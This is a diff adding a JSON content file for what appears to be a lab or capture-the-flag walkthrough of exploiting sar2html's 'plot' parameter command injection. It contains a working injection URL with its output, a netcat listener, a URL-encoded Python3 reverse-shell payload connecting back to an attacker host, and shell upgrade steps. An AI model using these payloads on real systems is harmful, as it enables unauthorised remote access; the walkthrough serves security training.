@@ -1,0 +1,83 @@
+[
+  {
+    "type": "section_heading",
+    "id": "sar2html-rce-intro",
+    "text": "Phase 1: Exploiting sar2html (Remote Code Execution)"
+  },
+  {
+    "type": "order_block",
+    "id": "rce-logic",
+    "text": "The discovery of <highlight>sar2html</highlight> in a hidden directory is the primary entry point. This application is vulnerable to <highlight>Remote Code Execution (RCE)</highlight> via the 'plot' parameter. By appending a semicolon followed by a system command to the URL, we can force the server to execute arbitrary bash commands as the <highlight>www-data</highlight> user."
+  },
+  {
+    "type": "section_heading",
+    "id": "rce-verification",
+    "text": "Step 1: Verifying the Vulnerability (PoC)"
+  },
+  {
+    "type": "order_block",
+    "id": "poc-logic",
+    "text": "We test for RCE by injecting a simple <highlight>id</highlight> or <highlight>pwd</highlight> command into the URL. If the server is vulnerable, the command output will appear within the 'Select Plot' dropdown menu or the page source."
+  },
+  {
+    "type": "code_block",
+    "id": "browser-poc",
+    "language": "text",
+    "code": "# URL-based Command Injection\nhttp://10.114.161.147/joomla/_test/index.php?plot=;id"
+  },
+  {
+    "type": "output_block",
+    "id": "rce-output",
+    "language": "text",
+    "code": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+  },
+  {
+    "type": "section_heading",
+    "id": "reverse-shell-delivery",
+    "text": "Step 2: Gaining a Reverse Shell"
+  },
+  {
+    "type": "order_block",
+    "id": "rev-shell-logic",
+    "text": "Once RCE is confirmed, we use a <highlight>Python3</highlight> one-liner to establish a reverse connection back to our Kali machine. This provides a more stable interactive environment than the URL bar."
+  },
+  {
+    "type": "code_block",
+    "id": "kali-listener",
+    "language": "bash",
+    "code": "# On Kali (Azid@Azid)\nnc -lvnp 4444"
+  },
+  {
+    "type": "code_block",
+    "id": "payload-injection",
+    "language": "text",
+    "code": "# Injecting the Python3 Reverse Shell (URL Encoded)\nindex.php?plot=;python3%20-c%20'import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<KALI_IP>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
+  },
+  {
+    "type": "section_heading",
+    "id": "shell-stabilization",
+    "text": "Step 3: Upgrading to a TTY Shell"
+  },
+  {
+    "type": "order_block",
+    "id": "tty-logic",
+    "text": "A standard netcat shell is 'dumb' (no tab-completion or arrow keys). We upgrade it to a full <highlight>TTY</highlight> shell using Python and terminal state manipulation."
+  },
+  {
+    "type": "code_block",
+    "id": "tty-upgrade",
+    "language": "bash",
+    "code": "# Inside the netcat shell\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# Press Ctrl+Z to background, then:\nstty raw -echo; fg\n\n# Inside the shell again:\nexport TERM=xterm"
+  },
+  {
+    "type": "explanation",
+    "id": "sar2-summary",
+    "title": "sar2html RCE Summary",
+    "items": [
+      "Vulnerability: Unsanitized input in the 'plot' GET parameter",
+      "Impact: Remote Code Execution (RCE) as the web user (www-data)",
+      "Stability: Upgrade to TTY is required for complex enumeration",
+      "Next Step: Begin local file system enumeration for lateral movement"
+    ]
+  }
+]
